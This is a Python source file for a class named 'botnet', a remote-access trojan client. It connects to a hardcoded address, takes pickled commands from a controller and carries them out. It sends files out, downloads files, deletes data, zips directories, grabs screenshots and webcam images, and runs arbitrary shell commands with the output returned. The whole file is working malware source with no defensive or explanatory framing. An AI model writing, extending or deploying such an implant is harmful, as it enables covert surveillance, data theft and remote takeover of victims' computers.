import os
import shutil
import socket
import pickle
import pyautogui
import subprocess
from cv2 import VideoCapture,imwrite
from zipfile import ZipFile,ZIP_DEFLATED

class botnet:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

        self.buffer_size = 1024

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def run(self):
        self.client.connect((self.ip,self.port))

        while True:
            server_data = self.recv_command()

            if server_data[0] == 'send':
                self.send_file(server_data[1])

            elif server_data[0] == 'recv':
                self.receive_file(server_data[1])

            elif server_data[0] == 'remv':
                self.remove(server_data[1])

            elif server_data[0] == 'archive':
                self.archive(server_data[1])

            elif server_data[0] == 'extract':
                self.extract(server_data[1])

            elif server_data[0] == 'screenshot':
                filename = 'screenshot.png'
                self.screenshot(filename)

            elif server_data[0] == 'camcapture':
                filename = 'camcapture.png'
                self.cameracapture(filename)

            elif server_data[0] == 'terminal':
                self.terminal(server_data[1])
                
            elif server_data[0] == 'exit':
                print('closing connection...')
                self.close_connection()
                break

            else:
                print(server_data)

    def recv_command(self):
        return pickle.loads(self.client.recv(self.buffer_size))
    
    def send_file(self,filename):
        with open(filename,'rb') as f:
            buffer = f.read(self.buffer_size)

            while buffer:
                self.client.send(buffer)
                buffer = f.read(self.buffer_size)

        self.reconnect()

    def receive_file(self,filename):
        with open(filename,'wb') as f:
            buffer = self.client.recv(self.buffer_size)

            while buffer:
                f.write(buffer)
                buffer = self.client.recv(self.buffer_size)

        self.reconnect()

    def remove(self,file):
        if os.path.exists(file):
            if os.path.isfile(file):
                os.remove(file)
            else:
                shutil.rmtree(file)

    def archive(self, directory):
        zipname = directory + '.zip'

        with ZipFile(zipname,'w',compression=ZIP_DEFLATED) as myzip:
            for root,dirs,files in os.walk(directory):
                for file in files:
                    myzip.write(os.path.join(root,file),os.path.relpath(
                        os.path.join(root,file),os.path.join(directory,'..')))

    def extract(self, zipfile):
        with ZipFile(zipfile,'r') as myzip:
            myzip.extractall()

    def screenshot(self,filename):
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(filename)
        self.send_file(filename)


    def cameracapture(self,filename):
        cam_port = 0
        cam = VideoCapture(cam_port)

        result,image = cam.read()

        if result:
            imwrite(filename,image)
        self.send_file(filename)

    def terminal(self,command):
        filename = 'terminalout.txt'
        with open(filename,'w') as f:
            subprocess.run(command, shell=True, stdout=f, text=True, stderr=subprocess.DEVNULL)
        self.send_file(filename)

    def close_connection(self):
        self.client.shutdown(socket.SHUT_WR)
        self.client.close()

    def reconnect(self):
        self.close_connection()
        self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.client.connect((self.ip,self.port))


bot = botnet('192.168.184.1',5050)
bot.run()